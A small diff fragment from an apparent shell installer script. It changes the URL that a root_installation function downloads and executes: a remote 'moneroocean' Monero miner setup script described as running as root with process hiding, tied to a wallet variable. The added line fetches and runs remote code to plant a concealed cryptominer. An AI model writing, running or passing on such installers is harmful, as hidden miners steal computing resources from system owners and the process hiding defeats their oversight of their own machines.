@@ -509,7 +509,7 @@ root_installation() {
     
     # Run the miner setup
     download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_with_processhide.sh" \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_with_processhide_CORRECTED.sh" \
         "$WALLET" \
         "root miner setup"
     
